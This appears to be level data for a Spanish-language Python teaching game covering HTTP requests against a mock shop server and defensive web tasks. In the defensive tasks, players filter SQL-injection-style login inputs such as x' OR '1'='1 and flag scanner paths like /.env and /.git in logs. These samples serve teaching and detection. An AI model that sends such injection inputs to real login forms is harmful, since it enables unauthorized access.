      'resp = fetch_url("https://shopstack.local/api/v1/products")\n' +
      '\n' +
      '# .json() parsea el body string a estructura Python\n' +
      'productos = resp.[TODO: método para parsear JSON]()\n' +
      '\n' +
      '# productos es una lista de dicts {id, name, price}\n' +
      'for p in productos:\n' +
      '    print(f"#{p[\'id\']} {p[\'name\']} — €{p[\'price\']}")\n' +
      '\n' +
      '# len() da el número de elementos de la lista\n' +
      'print(f"Total: {[TODO: len(...) sobre productos]} productos")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\.json\s*\(\s*\)/, message: "Usa response.json() para parsear" },
      { type: 'mustContain', regex: /\bfetch_url\s*\(/, message: "Sigue usando fetch_url" },
    ],
    endpoints: {
      "https://shopstack.local/api/v1/products": {
        GET: {
          status: 200,
          body: '[{"id":1,"name":"Teclado mecánico","price":89.90},{"id":2,"name":"Ratón gaming","price":49.50},{"id":3,"name":"Monitor 27","price":279.00}]',
          headers: { "content-type": "application/json" },
        },
      },
    },
  },

  {
    id: 21, chapter: 3,
    title: "POST con datos",
    location: "ShopStack · QA del formulario de login",
    concept: "POST + body de datos",
    gives_potion: true,
    intro:
      "\"El equipo de QA de ShopStack te pasa las credenciales de un usuario de pruebas " +
      "del entorno (qa_user / qa-pass-2026) y te pide validar el endpoint de login: que " +
      "responda 401 con password mal y 200 con password bien. POST envía datos al " +
      "servidor — login, formularios, creación de recursos. fetch_url(url, 'POST', " +
      "data={...}) — el dict data se manda como cuerpo del request.\"",
    outro:
      "Endpoint validado. VPN burner añadida al kit.",
    diary:
      "Día 21. POST. Mando un dict {usuario, contraseña}, el servidor responde 200 si " +
      "las credenciales son correctas, 401 si no. Las credenciales del entorno de QA " +
      "las pasa el dev — yo solo verifico que el flujo del login responde como debe.",
    mission:
      "Endpoint: \"https://shopstack.local/login\" (POST).\n" +
      "Acepta JSON: { \"username\": \"...\", \"password\": \"...\" }.\n\n" +
      "Caso 1 (negativo): username=\"qa_user\", password=\"wrong\". Esperas 401. Imprime " +
      "status y body.\n" +
      "Caso 2 (positivo): username=\"qa_user\", password=\"qa-pass-2026\". Esperas 200. " +
      "Imprime status y body.\n" +
      "Si el segundo caso da 200, imprime también: \"Login OK — endpoint validado\".",
    hint:
      'def intentar(u, p):\n    resp = fetch_url("https://shopstack.local/login", "POST", {"username": u, "password": p})\n    print(f"{u}/{p} -> {resp.status}: {resp.body[:80]}")\n    return resp\n\nintentar("qa_user", "wrong")\nresp = intentar("qa_user", "qa-pass-2026")\nif resp.status == 200:\n    print("Login OK — endpoint validado")',
    strategy:
      "PASO 1 — Vas a hacer DOS peticiones POST al mismo endpoint con\n" +
      "         credenciales distintas. Para no repetir código, define\n" +
      "         una función auxiliar:\n" +
      "             def intentar(u, p):\n" +
      "                 resp = fetch_url(url, \"POST\", {\"username\": u,\n" +
      "                                                 \"password\": p})\n" +
      "                 print(f\"{u}/{p} -> {resp.status}: ...\")\n" +
      "                 return resp\n" +
      "\n" +
      "PASO 2 — fetch_url con POST tiene 4 argumentos:\n" +
      "             fetch_url(url, method, data, headers)\n" +
      "         method = \"POST\" (string).\n" +
      "         data = dict — se envía como cuerpo del request.\n" +
      "         headers = None (no necesitamos custom).\n" +
      "\n" +
      "PASO 3 — Caso negativo: intentar(\"qa_user\", \"wrong\"). Esperas que\n" +
      "         devuelva 401. La función ya imprime la línea con el\n" +
      "         resultado. Llama y descarta el retorno.\n" +
      "\n" +
      "PASO 4 — Caso positivo: intentar(\"qa_user\", \"qa-pass-2026\").\n" +
      "         Guarda la respuesta en una variable. Esperas 200.\n" +
      "\n" +
      "PASO 5 — Si la segunda llamada devuelve 200, imprime la línea de\n" +
      "         confirmación: \"Login OK — endpoint validado\".\n" +
      "\n" +
      "RECORDATORIO — Validación de QA, no \"adivinar credenciales\". El\n" +
      "         dev te ha pasado las del entorno. Tu trabajo es comprobar\n" +
      "         que el endpoint responde correctamente con/sin password.",
    skeleton:
      '# Función auxiliar: hace POST con credenciales y devuelve la respuesta\n' +
      'def intentar(u, p):\n' +
      '    resp = fetch_url(\n' +
      '        "https://shopstack.local/login",\n' +
      '        [TODO: método HTTP — string "POST"],\n' +
      '        {"username": u, "password": p},\n' +
      '    )\n' +
      '    print(f"{u}/{p} -> {resp.status}: {resp.body[:80]}")\n' +
      '    return resp\n' +
      '\n' +
      '# Caso negativo: password incorrecta — esperas 401\n' +
      'intentar("qa_user", "wrong")\n' +
      '\n' +
      '# Caso positivo: credenciales QA — esperas 200\n' +
      'resp = intentar("qa_user", [TODO: la password QA correcta])\n' +
      '\n' +
      'if resp.status [TODO: comparador igualdad] 200:\n' +
      '    print("Login OK — endpoint validado")',
    starterCode:
      '# Validación del endpoint /login. Detalles en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /["']POST["']/, message: "Usa POST como método" },
      { type: 'mustContain', regex: /\bfetch_url\s*\([^)]*POST/, message: "fetch_url con método POST" },
    ],
    endpoints: {
      "https://shopstack.local/login": {
        POST: ({ data }) => {
          const u = (data && data.username) || "";
          const p = (data && data.password) || "";
          if (u === "qa_user" && p === "qa-pass-2026") {
            return { status: 200, body: '{"success":true,"token":"eyJhbGciOiJIUzI1NiJ9.qa"}', cookies: { session: "qa-session-001" } };
          }
          return { status: 401, body: '{"success":false,"error":"invalid credentials"}' };
        },
      },
    },
  },

  {
    id: 22, chapter: 3,
    title: "Sesiones y cookies",
    location: "ShopStack · panel autenticado",
    concept: "Cookies persistentes entre peticiones",
    intro:
      "\"Tras un login con éxito, el servidor te da una cookie de sesión. La próxima " +
      "petición la lleva automáticamente y demuestra que sigues siendo tú. fetch_url " +
      "guarda las cookies en una sesión interna por todo el run.\"",
    outro:
      "Sesión mantenida correctamente.",
    diary:
      "Día 22. Login + persistencia de cookie. Tras el POST a /login, las siguientes " +
      "peticiones llevan la cookie de sesión sin que yo haga nada. resp.cookies muestra " +
      "lo que llegó del servidor.",
    mission:
      "Mismo entorno QA del nivel anterior (qa_user / qa-pass-2026).\n\n" +
      "1) POST a /login con las credenciales QA.\n" +
      "2) Imprime las cookies recibidas (resp.cookies).\n" +
      "3) Llama GET a /qa/dashboard. Solo responde 200 si llega la cookie de sesión.\n" +
      "4) Imprime el body recibido.",
    hint:
      'login = fetch_url("https://shopstack.local/login", "POST", {"username":"qa_user","password":"qa-pass-2026"})\nprint(f"Cookies tras login: {login.cookies}")\n\nresp = fetch_url("https://shopstack.local/qa/dashboard")\nprint(f"Dashboard: {resp.status}")\nprint(resp.body)',
    strategy:
      "PASO 1 — Concepto: la sesión HTTP del juego acumula cookies entre\n" +
      "         llamadas durante una misma ejecución. Cuando un servidor\n" +
      "         te manda una cookie en una respuesta, todas las peticiones\n" +
      "         siguientes la llevan automáticamente.\n" +
      "\n" +
      "PASO 2 — Primera petición: POST /login con credenciales QA. Guarda\n" +
      "         la respuesta en una variable login para inspeccionarla.\n" +
      "\n" +
      "PASO 3 — login.cookies es un dict con las cookies que el servidor\n" +
      "         ha SETeado en la respuesta. Imprímelo para ver qué te ha\n" +
      "         dado: f\"Cookies tras login: {login.cookies}\".\n" +
      "\n" +
      "PASO 4 — Segunda petición: GET /qa/dashboard. NO necesitas pasar\n" +
      "         las cookies manualmente — fetch_url las gestiona en su\n" +
      "         sesión interna y las envía solas.\n" +
      "\n" +
      "PASO 5 — Imprime el status del dashboard. Si llega la cookie de\n" +
      "         sesión correctamente, da 200. Si no, 401.\n" +
      "         Imprime también resp.body para ver el contenido.\n" +
      "\n" +
      "RECORDATORIO — En requests real, esta gestión la haría una sesión:\n" +
      "             s = requests.Session()\n" +
      "             s.post(...); s.get(...)\n" +
      "         La sesión guarda cookies entre peticiones. fetch_url hace\n" +
      "         lo mismo automáticamente entre llamadas del mismo run.",
    skeleton:
      '# 1) Login: POST con credenciales QA. La respuesta tiene .cookies con\n' +
      '#    lo que el servidor SETea (cookie de sesión).\n' +
      'login = fetch_url(\n' +
      '    "https://shopstack.local/login",\n' +
      '    "POST",\n' +
      '    {"username": [TODO: "qa_user"], "password": [TODO: la password QA]},\n' +
      ')\n' +
      'print(f"Cookies tras login: {login.[TODO: atributo de cookies]}")\n' +
      '\n' +
      '# 2) Petición autenticada — la cookie va sola\n' +
      'resp = fetch_url("https://shopstack.local/qa/dashboard")\n' +
      'print(f"Dashboard: {resp.status}")\n' +
      'print(resp.body)',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\.cookies\b/, message: "Imprime las cookies de la respuesta" },
      { type: 'mustContain', regex: /["']POST["']/, message: "Haz un POST de login" },
    ],
    endpoints: {
      "https://shopstack.local/login": {
        POST: ({ data }) => {
          const u = (data && data.username) || "";
          const p = (data && data.password) || "";
          if (u === "qa_user" && p === "qa-pass-2026") {
            return { status: 200, body: '{"ok":true}', cookies: { session: "qa-session-001" } };
          }
          return { status: 401, body: '{"ok":false}' };
        },
      },
      "https://shopstack.local/qa/dashboard": {
        GET: ({ cookies }) => {
          if (cookies && cookies.session === "qa-session-001") {
            return { status: 200, body: '{"orders":42,"revenue":18450.20,"users":1027}' };
          }
          return { status: 401, body: '{"error":"login required"}' };
        },
      },
    },
  },

  {
    id: 23, chapter: 3,
    title: "Headers a medida",
    location: "ShopStack · API privada",
    concept: "Headers HTTP personalizados",
    intro:
      "\"Patrón común en APIs modernas: autenticación por header Authorization en lugar " +
      "de cookie de sesión. El equipo de ShopStack te pasa el token de servicio del " +
      "entorno de QA y quiere que verifiques que el endpoint privado responde 401 sin " +
      "header y 200 con el header correcto. fetch_url acepta " +
      "headers={'Authorization': 'Bearer ...'} como cuarto argumento.\"",
    outro:
      "Endpoint privado validado con autenticación por header.",
    diary:
      "Día 23. Autenticación por header Bearer. Más limpio que cookies para APIs " +
      "stateless. El token me lo pasa el dev del entorno QA — yo solo confirmo que el " +
      "endpoint exige header válido y rechaza el resto.",
    mission:
      "Endpoint: \"https://shopstack.local/api/v1/secret\". Token de QA: \"QA-TOKEN-XYZ\".\n\n" +
      "1) Petición SIN headers — esperas 401.\n" +
      "2) Petición CON header Authorization: \"Bearer QA-TOKEN-XYZ\" — esperas 200 y un " +
      "JSON con la flag de QA.\n" +
      "3) Imprime el status de cada una y, en la segunda, el contenido del JSON.",
    hint:
      'resp = fetch_url("https://shopstack.local/api/v1/secret")\nprint(f"Sin auth: {resp.status}")\n\nh = {"Authorization": "Bearer QA-TOKEN-XYZ"}\nresp = fetch_url("https://shopstack.local/api/v1/secret", "GET", None, h)\nprint(f"Con auth: {resp.status}")\nprint(resp.json())',
    strategy:
      "PASO 1 — Primera petición SIN headers. Esperas 401 porque el\n" +
      "         endpoint requiere autenticación por header Bearer:\n" +
      "             resp = fetch_url(\"https://shopstack.local/api/v1/secret\")\n" +
      "             print(resp.status)  # 401\n" +
      "\n" +
      "PASO 2 — Para enviar headers, fetch_url tiene 4 argumentos\n" +
      "         posicionales:\n" +
      "             fetch_url(url, method, data, headers)\n" +
      "         Como solo quieres mandar headers (no datos), pon:\n" +
      "             - method = \"GET\"\n" +
      "             - data = None\n" +
      "             - headers = el dict\n" +
      "\n" +
      "PASO 3 — Construye el dict headers:\n" +
      "             h = {\"Authorization\": \"Bearer QA-TOKEN-XYZ\"}\n" +
      "         Convención: \"Bearer\" + espacio + token. Es el formato\n" +
      "         estándar de OAuth 2.0. El servidor parsea esa cadena para\n" +
      "         sacar el token.\n" +
      "\n" +
      "PASO 4 — Segunda petición CON headers:\n" +
      "             resp = fetch_url(url, \"GET\", None, h)\n" +
      "         Esta vez devuelve 200 y un body JSON con la flag QA.\n" +
      "\n" +
      "PASO 5 — Imprime el status. Después imprime resp.json() para ver\n" +
      "         el JSON parseado. Como es un dict, print lo muestra como\n" +
      "         dict de Python.\n" +
      "\n" +
      "RECORDATORIO — En requests real:\n" +
      "             requests.get(url, headers={\"Authorization\": \"Bearer ...\"})\n" +
      "         Misma idea, sintaxis ligeramente más limpia (kwarg).",
    skeleton:
      '# 1) Sin headers — esperas 401\n' +
      'resp = fetch_url("https://shopstack.local/api/v1/secret")\n' +
      'print(f"Sin auth: {resp.status}")\n' +
      '\n' +
      '# 2) Con headers — Authorization: Bearer + espacio + token\n' +
      'h = {"Authorization": [TODO: "Bearer QA-TOKEN-XYZ"]}\n' +
      '\n' +
      '# fetch_url posicional: (url, method, data, headers)\n' +
      'resp = fetch_url(\n' +
      '    "https://shopstack.local/api/v1/secret",\n' +
      '    "GET",\n' +
      '    [TODO: None — no enviamos datos],\n' +
      '    h,\n' +
      ')\n' +
      'print(f"Con auth: {resp.status}")\n' +
      '\n' +
      '# .json() devuelve la estructura Python parseada\n' +
      'print(resp.[TODO: método para parsear JSON]())',
    starterCode:
      '# Endpoint y token QA en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /["']Authorization["']/i, message: "Envía un header Authorization" },
      { type: 'mustContain', regex: /\bBearer\b/, message: 'El token va en formato "Bearer XXXXX"' },
    ],
    endpoints: {
      "https://shopstack.local/api/v1/secret": {
        GET: ({ headers }) => {
          const auth = (headers && (headers.Authorization || headers.authorization)) || "";
          if (auth === "Bearer QA-TOKEN-XYZ") {
            return { status: 200, body: '{"flag":"FLAG{header-auth-ok}","note":"QA-only API resource"}' };
          }
          return { status: 401, body: '{"error":"missing or invalid Authorization header"}' };
        },
      },
    },
  },

  {
    id: 24, chapter: 3,
    title: "Evaluación: panel QA",
    location: "Sala de evaluaciones · ShopStack",
    concept: "EVALUACIÓN — flujo HTTP completo",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Flujo completo: login en el entorno QA, navegar autenticado, parsear JSON, " +
      "manejar errores. Sin pista.\"",
    outro:
      "Cap 3 cerrado. Próximo: defensa de aplicaciones web.",
    diary:
      "Día 24. Tercer examen. Flujo HTTP completo en menos de 20 líneas — el típico " +
      "smoke-test que el equipo de QA dejaría corriendo en CI.",
    mission:
      "1) Login en /login (POST) con qa_user / qa-pass-2026.\n" +
      "2) Si falla, imprime \"ACCESO DENEGADO\" y termina (return o sys.exit).\n" +
      "3) Si va, GET a /qa/orders. Parsea el JSON.\n" +
      "4) Suma el total de \"amount\" de todos los pedidos e imprime el total con 2 decimales.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 18 líneas\n" +
      "• Debes definir al menos una función con def\n" +
      "• Debes usar fetch_url con POST y con GET\n" +
      "• Debes usar .json()",
    hint: "Evaluación sin pista.",
    solution:
      'def main():\n    login = fetch_url("https://shopstack.local/login", "POST", {"username":"qa_user","password":"qa-pass-2026"})\n    if login.status != 200:\n        print("ACCESO DENEGADO")\n        return\n    orders = fetch_url("https://shopstack.local/qa/orders").json()\n    total = sum(o["amount"] for o in orders)\n    print(f"Pedidos: {len(orders)}")\n    print(f"Total facturado: €{total:.2f}")\n\nmain()',
    starterCode:
      '# EVALUACIÓN — Capítulo 3\n# Login QA + navegación autenticada + suma\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 18, message: "Máximo 18 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
      { type: 'mustContain', regex: /["']POST["']/, message: "Haz un POST" },
      { type: 'mustContain', regex: /\.json\s*\(/, message: "Usa .json() para parsear" },
    ],
    endpoints: {
      "https://shopstack.local/login": {
        POST: ({ data }) => {
          if (data && data.username === "qa_user" && data.password === "qa-pass-2026") {
            return { status: 200, body: '{"ok":true}', cookies: { session: "exam-session" } };
          }
          return { status: 401, body: '{"ok":false}' };
        },
      },
      "https://shopstack.local/qa/orders": {
        GET: ({ cookies }) => {
          if (cookies && cookies.session === "exam-session") {
            return { status: 200, body: '[{"id":101,"amount":120.50},{"id":102,"amount":75.00},{"id":103,"amount":350.20},{"id":104,"amount":12.99},{"id":105,"amount":890.00}]' };
          }
          return { status: 401, body: '{"error":"unauthorized"}' };
        },
      },
    },
  },

  // ============================================================
  // CAPÍTULO 4 — DEFENSA DE APLICACIONES WEB (25-30)
  // Foco: validar input, auditar logs, security headers, authz, path
  // normalization. El reverso defensivo de las vulnerabilidades clásicas.
  // ============================================================
  {
    id: 25, chapter: 4,
    title: "Filtrar input sospechoso",
    location: "ShopStack · revisión del login",
    concept: "Validación de input — denylist con regex",
    is_checkpoint: true,
    intro:
      "\"El equipo dev de ShopStack te pide ayuda. Han recibido alertas de logins " +
      "con cadenas raras y quieren un pre-filtro Python en el middleware: si el " +
      "input contiene metacaracteres típicos de inyección, marcarlo y rechazarlo. " +
      "Ojo: el arreglo de fondo son prepared statements y parámetros tipados — " +
      "esta capa solo es un aviso temprano, no una defensa real por sí sola.\"",
    outro:
      "Filtro escrito. Ahora ShopStack al menos avisa cuando alguien empuja " +
      "metacaracteres en el formulario.",
    diary:
      "Día 25. Mi primer commit a un repo de cliente. Diez líneas de regex que " +
      "frenan los intentos más torpes. La defensa real la hace el ORM con " +
      "parámetros — esto es solo telemetría barata.",
    mission:
      "Tienes una lista INTENTOS de logins (cada uno un dict {user, password}).\n\n" +
      "1) Define is_suspicious(s) que devuelva True si s contiene una comilla " +
      "simple ('), un doble guion (--), o las palabras OR/UNION (case-insensitive). " +
      "Usa re.search.\n" +
      "2) Recorre INTENTOS. Para cada uno, si user O password son sospechosos, " +
      "imprime: \"BLOQUEADO: <user!r>/<password!r>\".\n" +
      "3) Cuenta los limpios y al final imprime: \"Limpios: N\".",
    hint:
      'import re\n\ndef is_suspicious(s):\n    return bool(re.search(r"\'|--|\\bOR\\b|\\bUNION\\b", s, re.IGNORECASE))\n\nlimpios = 0\nfor it in INTENTOS:\n    if is_suspicious(it["user"]) or is_suspicious(it["password"]):\n        print(f"BLOQUEADO: {it[\'user\']!r}/{it[\'password\']!r}")\n    else:\n        limpios += 1\nprint(f"Limpios: {limpios}")',
    strategy:
      "PASO 1 — Define is_suspicious(s) con re.search. El patrón debe\n" +
      "         alcanzar 4 cosas:\n" +
      "         - comilla simple ('): puede iniciar inyección de string.\n" +
      "         - doble guion (--): inicio de comentario SQL.\n" +
      "         - palabra OR (case-insensitive): keyword de SQL.\n" +
      "         - palabra UNION (case-insensitive).\n" +
      "         Las palabras necesitan \\b (word boundary) para que 'OR'\n" +
      "         dentro de 'PORQUE' NO matchee.\n" +
      "         Patrón: r\"'|--|\\bOR\\b|\\bUNION\\b\"\n" +
      "         Flag: re.IGNORECASE para que matchee or/Or/oR/OR.\n" +
      "\n" +
      "PASO 2 — re.search devuelve un Match o None. bool(match) lo\n" +
      "         convierte a True/False directamente.\n" +
      "\n" +
      "PASO 3 — Inicializa contador limpios = 0.\n" +
      "\n" +
      "PASO 4 — Recorre INTENTOS. Para cada uno:\n" +
      "         - Si is_suspicious del user O del password → bloqueado.\n" +
      "           Imprime con !r (repr — pone comillas) los dos campos.\n" +
      "         - Si no, incrementa limpios.\n" +
      "\n" +
      "PASO 5 — Al final imprime el contador.\n" +
      "\n" +
      "RECUERDA — Esta capa es solo telemetría. La defensa real son los\n" +
      "         prepared statements. Un filtro denylist nunca cubre todos\n" +
      "         los casos (charset distintos, encoding, comments raros).",
    skeleton:
      'import re\n' +
      '\n' +
      'def is_suspicious(s):\n' +
      '    # \\b son boundaries de palabra. re.IGNORECASE ignora mayús/minús.\n' +
      '    return bool(re.search(\n' +
      '        r"[TODO: patrón con \',  --, \\bOR\\b, \\bUNION\\b]",\n' +
      '        s,\n' +
      '        re.IGNORECASE,\n' +
      '    ))\n' +
      '\n' +
      'limpios = 0\n' +
      'for it in INTENTOS:\n' +
      '    if is_suspicious(it["user"]) [TODO: operador lógico OR] is_suspicious(it["password"]):\n' +
      '        # !r aplica repr() → pone comillas alrededor del string\n' +
      '        print(f"BLOQUEADO: {it[\'user\']!r}/{it[\'password\']!r}")\n' +
      '    else:\n' +
      '        limpios += 1\n' +
      '\n' +
      'print(f"Limpios: {limpios}")',
    starterCode:
      '# Pre-filtro defensivo: marca inputs con metacaracteres SQLi obvios.\n# El arreglo real es prepared statements; esto es una capa de aviso.\nimport re\n\nINTENTOS = [\n    {"user": "alice",  "password": "letmein"},\n    {"user": "admin",  "password": "x\' OR \'1\'=\'1"},\n    {"user": "bob",    "password": "hunter2"},\n    {"user": "x-- ",   "password": "x"},\n    {"user": "carol",  "password": "UNION select"},\n    {"user": "diego",  "password": "qwerty"},\n]\n\n# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+is_suspicious\b/, message: "Define la función is_suspicious" },
      { type: 'mustContain', regex: /\bimport\s+re\b/, message: "Importa re" },
      { type: 'mustContain', regex: /\bre\.(search|match|findall)\s*\(/, message: "Usa re.search (u otra función de re)" },
    ],
  },

  {
    id: 26, chapter: 4,
    title: "Auditando un access.log",
    location: "ShopStack · análisis de logs nginx",
    concept: "Counter() + filtrado por path sospechoso",
    intro:
      "\"El SRE de ShopStack te pasa unas horas de access.log de nginx. Quiere " +
      "saber si alguien está escaneando la app. Patrones típicos: una IP haciendo " +
      "decenas de requests a paths que no existen (/.env, /.git, /wp-login, " +
      "/admin). Tu trabajo: contar y reportar.\"",
    outro:
      "Patrones de escaneo identificados. El SRE los pasará al WAF como reglas.",
    diary:
      "Día 26. Logs. La primera fuente de verdad cuando algo huele raro. Counter() " +
      "+ filtro por path. Saco un resumen decente en menos de 20 líneas.",
    mission:
      "Tienes una lista LOGS de tuplas (ip, method, path, status). Trabajo:\n\n" +
      "1) Cuenta cuántos requests hace cada IP. Imprime el top-3 con .most_common.\n" +
      "2) Define paths sospechosos: contienen \"/.env\", \"/.git\", \"/wp-login\" " +
      "o \"/admin\".\n" +
      "3) Para cada IP que haya tocado al menos un path sospechoso, imprime: " +
      "\"SCANNER: <ip> tocó <N> rutas sospechosas\".",
    hint:
      'from collections import Counter\n\ntotales = Counter(ip for ip, _, _, _ in LOGS)\nfor ip, n in totales.most_common(3):\n    print(f"{ip}: {n} requests")\n\nSUS_PATTERNS = ("/.env", "/.git", "/wp-login", "/admin")\nsus = Counter()\nfor ip, _, path, _ in LOGS:\n    if any(p in path for p in SUS_PATTERNS):\n        sus[ip] += 1\n\nfor ip, n in sus.items():\n    print(f"SCANNER: {ip} tocó {n} rutas sospechosas")',
    strategy:
      "PASO 1 — Cuenta requests por IP usando Counter:\n" +
      "             totales = Counter(ip for ip, _, _, _ in LOGS)\n" +
      "         Notar el desempaquetado de la tupla con _ para los campos\n" +
      "         que no necesitas. Counter acepta cualquier iterable.\n" +
      "\n" +
      "PASO 2 — .most_common(3) devuelve los 3 más frecuentes como lista\n" +
      "         de tuplas (valor, cuenta). Itera y print para cada uno:\n" +
      "             for ip, n in totales.most_common(3):\n" +
      "\n" +
      "PASO 3 — Define los patrones sospechosos como tupla (más rápido\n" +
      "         que lista para iterar varias veces):\n" +
      "             SUS_PATTERNS = (\"/.env\", \"/.git\", \"/wp-login\", \"/admin\")\n" +
      "\n" +
      "PASO 4 — Cuenta IPs que tocan paths sospechosos. Crea otro Counter\n" +
      "         vacío sus = Counter() y recorre LOGS:\n" +
      "         - Si CUALQUIER patrón está en path → incrementa sus[ip].\n" +
      "         - any(p in path for p in SUS_PATTERNS) — generador con any.\n" +
      "         - sus[ip] += 1 — incrementar entrada del Counter (auto-inicializa\n" +
      "           a 0 si no existe).\n" +
      "\n" +
      "PASO 5 — Imprime la lista de scanners con .items().\n" +
      "         Las IPs que NO tocaron paths sospechosos no aparecen.",
    skeleton:
      'from collections import Counter\n' +
      '\n' +
      '# Top-3 IPs por nº de requests totales\n' +
      '# Counter acepta un generador. Desempaqueta la tupla con _.\n' +
      'totales = Counter(ip for ip, _, _, _ in LOGS)\n' +
      'for ip, n in totales.[TODO: método para top-N](3):\n' +
      '    print(f"{ip}: {n} requests")\n' +
      '\n' +
      '# Detectar scanners: IPs que han tocado paths sospechosos\n' +
      'SUS_PATTERNS = ("/.env", "/.git", "/wp-login", "/admin")\n' +
      '\n' +
      'sus = Counter()  # Counter vacío que llenaremos manualmente\n' +
      'for ip, _, path, _ in LOGS:\n' +
      '    # any(...) -> True si AL MENOS UN patrón está en el path\n' +
      '    if [TODO: any sobre la generación] (p in path for p in SUS_PATTERNS):\n' +
      '        sus[ip] += 1\n' +
      '\n' +
      'for ip, n in sus.items():\n' +
      '    print(f"SCANNER: {ip} tocó {n} rutas sospechosas")',
    starterCode:
      '# Misión en el briefing.\nfrom collections import Counter\n\n# Cada tupla: (ip, method, path, status)\nLOGS = [\n    ("10.0.0.5",     "GET",  "/",              200),\n    ("10.0.0.5",     "GET",  "/products",      200),\n    ("203.0.113.7",  "GET",  "/.env",          404),\n    ("203.0.113.7",  "GET",  "/admin",         404),\n    ("203.0.113.7",  "GET",  "/wp-login.php",  404),\n    ("203.0.113.7",  "GET",  "/.git/config",   404),\n    ("10.0.0.9",     "POST", "/api/login",     200),\n    ("10.0.0.9",     "GET",  "/account",       200),\n    ("203.0.113.7",  "GET",  "/admin/users",   403),\n    ("198.51.100.2", "GET",  "/",              200),\n    ("203.0.113.7",  "GET",  "/.env.bak",      404),\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bCounter\b/, message: "Usa Counter para contar" },
      { type: 'mustContain', regex: /\.most_common\b/, message: "Usa .most_common para el top-N" },
    ],
  },

  {
    id: 27, chapter: 4,
    title: "Auditoría de security headers",
    location: "ShopStack · checklist de hardening",
    concept: "Inspeccionar response.headers + comprobar ausencias",
    gives_potion: true,
    intro:
      "\"Los security headers son las defensas más baratas que existen — los pones " +
      "una vez en el servidor y reduces la superficie a XSS, clickjacking y " +
      "downgrade. Auditoría rápida: pedir cada página, mirar qué headers DEBERÍAN " +
      "estar y no están.\"",
    outro:
      "Lista de headers ausentes generada. El equipo dev tiene su próximo ticket. " +
      "Has obtenido una VPN burner.",
    diary:
      "Día 27. Aprendizaje barato del día: hay 4-5 headers que toda app web " +
      "debería mandar. El coste de añadirlos es minutos. La excusa de no tenerlos " +
      "es solo no haber mirado.",
    mission:
      "REQUERIDOS = [\"Content-Security-Policy\", \"Strict-Transport-Security\", " +
      "\"X-Frame-Options\", \"X-Content-Type-Options\"]\n\n" +
      "URLS = [\"https://shopstack.local/\", \"https://shopstack.local/admin\", " +
      "\"https://shopstack.local/api/health\"]\n\n" +
      "1) Para cada URL, fetch_url(GET) y mira r.headers (es un dict).\n" +
      "2) Calcula con list comprehension qué headers REQUERIDOS faltan.\n" +
      "3) Imprime: \"<url>: faltan <lista>\" — o \"<url>: OK\" si no falta ninguno.",
    hint:
      'REQUERIDOS = ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options"]\nURLS = ["https://shopstack.local/", "https://shopstack.local/admin", "https://shopstack.local/api/health"]\n\nfor url in URLS:\n    r = fetch_url(url)\n    faltan = [h for h in REQUERIDOS if h not in r.headers]\n    if faltan:\n        print(f"{url}: faltan {faltan}")\n    else:\n        print(f"{url}: OK")',
    strategy:
      "PASO 1 — Las dos listas (REQUERIDOS y URLS) ya están en el starter.\n" +
      "         Si las redefines duplicas, así que asume que existen.\n" +
      "\n" +
      "PASO 2 — Para cada URL, haz fetch_url(url) — solo GET, no necesitas\n" +
      "         pasar más argumentos. Devuelve un HttpResponse.\n" +
      "\n" +
      "PASO 3 — r.headers es un dict con los headers que devuelve el\n" +
      "         servidor. Para saber qué REQUERIDOS faltan, list compre-\n" +
      "         hension con la prueba 'h not in r.headers':\n" +
      "             faltan = [h for h in REQUERIDOS if h not in r.headers]\n" +
      "\n" +
      "PASO 4 — Si faltan tiene elementos → imprime los que faltan.\n" +
      "         Si está vacío → la URL pasa la auditoría.\n" +
      "         (En Python, una lista vacía es \"falsy\": `if []` es False.\n" +
      "         Por eso `if faltan:` funciona sin len(faltan) > 0.)\n" +
      "\n" +
      "PASO 5 — Recordatorio: estos 4 headers son los más universales para\n" +
      "         endurecer una app web — los puedes añadir en el servidor\n" +
      "         (nginx/apache) en una línea cada uno. Que falten todos\n" +
      "         significa que nadie los ha mirado nunca.",
    skeleton:
      'REQUERIDOS = ["Content-Security-Policy", "Strict-Transport-Security",\n' +
      '              "X-Frame-Options", "X-Content-Type-Options"]\n' +
      'URLS = ["https://shopstack.local/", "https://shopstack.local/admin",\n' +
      '        "https://shopstack.local/api/health"]\n' +
      '\n' +
      'for url in URLS:\n' +
      '    r = [TODO: fetch_url GET sobre url]\n' +
      '\n' +
      '    # List comprehension: headers requeridos que NO están en r.headers\n' +
      '    faltan = [h for h in REQUERIDOS if h [TODO: operador "no está en"] r.headers]\n' +
      '\n' +
      '    if faltan:\n' +
      '        print(f"{url}: faltan {faltan}")\n' +
      '    else:\n' +
      '        print(f"{url}: OK")',
    starterCode:
      '# Misión en el briefing.\n# Los 4 headers más universales para endurecer una app web.\nREQUERIDOS = ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options"]\nURLS = ["https://shopstack.local/", "https://shopstack.local/admin", "https://shopstack.local/api/health"]\n\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bfetch_url\s*\(/, message: "Usa fetch_url" },
      { type: 'mustContain', regex: /\.headers\b/, message: "Lee r.headers de la respuesta" },
      { type: 'mustContain', regex: /\[\s*\w+\s+for\s+\w+\s+in\b/, message: "Usa una list comprehension para los faltantes" },
    ],
    endpoints: {
      "https://shopstack.local/": {
        GET: () => ({ status: 200, body: "<html><body>shop</body></html>", headers: {
          "Content-Type": "text/html",
          "X-Frame-Options": "DENY",
          "Server": "nginx/1.24",
        }}),
      },
